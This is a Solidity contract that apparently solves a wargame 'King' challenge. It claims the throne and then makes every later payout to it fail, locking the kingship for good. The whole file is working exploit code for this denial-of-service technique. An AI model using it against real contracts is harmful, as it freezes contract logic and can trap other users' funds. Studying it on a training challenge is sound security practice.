// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IKing {
    function prize() external returns (uint256);
}

contract AlwaysKing {
    mapping(address => bool) internal _isKingInstance;

    receive() external payable {
        if (_isKingInstance[msg.sender]) {
            payable(msg.sender).call{value: address(this).balance}("");
        }
    }

    function setNewKingInstance(address king) public payable {
        uint256 prize = IKing(king).prize();
        require(msg.value >= prize + 1, "Not enough to be King");
        payable(king).call{value: prize + 1}("");
        payable(msg.sender).call{value: msg.value - (prize + 2)}("");
        _isKingInstance[king] = true;
    }
}